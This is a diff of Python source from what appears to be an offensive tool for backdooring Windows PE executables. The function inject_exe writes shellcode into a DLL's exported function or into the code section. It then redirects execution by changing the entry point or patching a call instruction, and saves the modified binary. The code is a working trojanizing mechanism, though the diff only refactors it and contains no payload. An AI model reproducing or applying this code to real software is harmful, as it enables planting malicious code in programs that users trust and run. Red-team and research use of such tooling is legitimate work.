@@ -44,69 +44,69 @@ def inject_exe(
     superpe = SuperPe(exe_in)
     pe_backdoorer = PeBackdoor(superpe, main_shc, carrier_invoke_style)
 
-    # Find a nice location for the shellcode
     shellcode_offset: int = 0
-    if superpe.is_dll():  # DLL
-        shellcode_offset = 0
-    else:  # EXE
-        pass
-    if True:
+    if superpe.is_dll() and settings.dllfunc != "" and carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
+        # Special case. put it at the beginning of the exported DLL function
+        logger.info("--[ Overwrite DLL function {} with shellcode".format(settings.dllfunc))
+        rva = pe_backdoorer.getExportEntryPoint(settings.dllfunc)
+        shellcode_offset = superpe.get_physical_address2(rva)
+        logger.info(f'---[ Using DLL Export "{settings.dllfunc}" at RVA 0x{rva:X} offset 0x{shellcode_offset:X} to overwrite')
+        superpe.pe.set_bytes_at_offset(shellcode_offset, main_shc)
+
+    else:  # Put it somewhere in the code section, and rewire the flow
         sect = superpe.get_code_section()
         if sect == None:
             raise Exception('Could not find code section in input PE file!')
         sect_name = sect.Name.decode().rstrip('\x00')
         sect_size = sect.Misc_VirtualSize  # Better than: SizeOfRawData
-
         if sect_size < l:
             raise Exception("Shellcode too large: {} > {}".format(
                 l, sect_size
             ))
         shellcode_offset = int((sect_size - l) / 2)
-    shellcode_rva = superpe.pe.get_rva_from_offset(shellcode_offset)
-    logger.info("--( Inject: Shellcode rva:0x{:X}  offset:0x{:X}".format(
-        shellcode_rva, shellcode_offset))
+        shellcode_rva = superpe.pe.get_rva_from_offset(shellcode_offset)
+        logger.info("--( Inject: Shellcode rva:0x{:X}  offset:0x{:X}".format(
+            shellcode_rva, shellcode_offset))
 
-    # Copy the shellcode
-    superpe.pe.set_bytes_at_offset(shellcode_offset, main_shc)
+        # Copy the shellcode
+        superpe.pe.set_bytes_at_offset(shellcode_offset, main_shc)
 
-    # HACK
-    pe_backdoorer.shellcodeOffset = shellcode_offset
-    pe_backdoorer.shellcodeOffsetRel = shellcode_offset - sect.PointerToRawData
-    pe_backdoorer.shellcodeAddr = shellcode_rva + superpe.pe.OPTIONAL_HEADER.ImageBase 
+        # HACK
+        pe_backdoorer.shellcodeOffset = shellcode_offset
+        pe_backdoorer.shellcodeOffsetRel = shellcode_offset - sect.PointerToRawData
+        pe_backdoorer.shellcodeAddr = shellcode_rva + superpe.pe.OPTIONAL_HEADER.ImageBase 
 
-    # rewire flow
-    if superpe.is_dll() and settings.dllfunc != "":
-        logger.info("---( Rewire: DLL function: {} ".format(settings.dllfunc))
+        # rewire flow
+        if superpe.is_dll() and settings.dllfunc != "":
+            logger.info("---( Rewire: DLL function: {} ".format(settings.dllfunc))
 
-        if carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
-            #raise Exception("--( Inject DLL: Change Entry Point unsupported when set ".format(
-            #    settings.dllfunc))
-            pass
+            if carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
+                # Handled above, without arriving here
+                raise Exception("We should not land here")
 
-        elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
-            addr = pe_backdoorer.getExportEntryPoint(settings.dllfunc)
+            elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
+                addr = pe_backdoorer.getExportEntryPoint(settings.dllfunc)
+                logger.info("--( Inject DLL: Patch {} (0x{:X})".format(
+                    settings.dllfunc, addr))
+                pe_backdoorer.backdoor_function(addr, shellcode_rva)
 
-            logger.info("--( Inject DLL: Patch {} (0x{:X})".format(
-                settings.dllfunc, addr))
-            pe_backdoorer.backdoor_function(addr, shellcode_rva)
+        else: # EXE
+            logger.info("---( Rewire: EXE")
 
-    else: # EXE
-        logger.info("---( Rewire: EXE")
+            if carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
+                logger.info("--( Inject EXE: Change Entry Point to 0x{:X}".format(
+                    shellcode_rva))
+                superpe.set_entrypoint(shellcode_rva)
 
-        if carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
-            logger.info("--( Inject EXE: Change Entry Point to 0x{:X}".format(
-                shellcode_rva))
-            superpe.set_entrypoint(shellcode_rva)
+            elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
+                addr = superpe.get_entrypoint()
+                logger.info("--( Inject EXE: Patch main() (0x{:X})".format(
+                    addr))
+                pe_backdoorer.backdoor_function(addr, shellcode_rva)
 
-        elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
-            addr = superpe.get_entrypoint()
-            logger.info("--( Inject EXE: Patch main() (0x{:X})".format(
-                addr))
-            pe_backdoorer.backdoor_function(addr, shellcode_rva)
-
-    if source_style == FunctionInvokeStyle.iat_reuse:
-        injected_fix_iat(superpe, project.carrier, project.exe_host)
-        injected_fix_data(superpe, project.carrier, project.exe_host)
+        if source_style == FunctionInvokeStyle.iat_reuse:
+            injected_fix_iat(superpe, project.carrier, project.exe_host)
+            injected_fix_data(superpe, project.carrier, project.exe_host)
 
     # We done
     superpe.write_pe_to_file(exe_out)
